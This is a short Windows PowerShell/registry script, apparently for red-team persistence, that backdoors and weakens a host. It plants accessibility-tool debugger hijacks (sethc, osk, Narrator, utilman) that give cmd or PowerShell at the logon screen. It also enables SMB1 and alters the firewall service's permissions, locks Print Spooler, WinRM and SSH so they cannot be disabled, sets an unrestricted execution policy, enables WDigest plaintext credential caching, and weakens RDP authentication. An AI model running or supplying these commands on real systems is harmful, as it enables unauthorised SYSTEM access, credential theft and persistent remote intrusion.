# Stickey Keys
Write-Host "Stickey Keys CMD Added"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /f

# Win+U
Write-Host "Win+U CMD Added"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f

# Enable SMB1
Write-Host "SMB1 Enabled"
# Windows 10
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
#Win2012R2/8
Set-SmbServerConfiguration -EnableSMB1Protocol $true
#Win7
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 1 -Force

#Disable Firewall service
Write-Host "Firewall Service Disabled"
sc sdset MpsSvc D:(A;;CCLCSWWPDTLOCRRC;;;SY)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLC;;;S-1-5-80-2006800713-1441093265-249754844-3404434343-1444102779)S:(AU;FA;CCDCLCSWWPDTLOCRSDRCWDWO;;;WD)
#Prevent Print Spooler from being disabled
Write-Host "Print Spooler Cannot be Disabled" 
sc sdset spooler D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPDTLOCRSDRCWDWO;;;WD)
#Prevent WinRM from being disabled
Write-Host "WinRM cannot be disabled"
sc sdset WinRM D:(A;;CCLCSWRPDTLOCRRC;;;SY)(A;;CCDCLCSWRPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
#Prevent SSH from being disabled
Write-Host "SSH cannot be disabled"
sc sdset sshd D:(A;;CCLCSWRPDTLOCRRC;;;SY)(A;;CCDCLCSWRPDTLOCRRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPDTLOCRRCWDWO;;;WD)

#Unrestricted PowerShell Exeuction Policy
Write-Host "PowerShell Execution Policy Set to Unrestricted"
Set-ExecutionPolicy -ExecutionPolicy unrestricted

#Allow plaintext caching of credentials
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

#Allow Multiple Simotanous RDP connections
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v UserAuthentication /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fDenyTSConnections /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fSingleSessionPerUser /d 10 /f
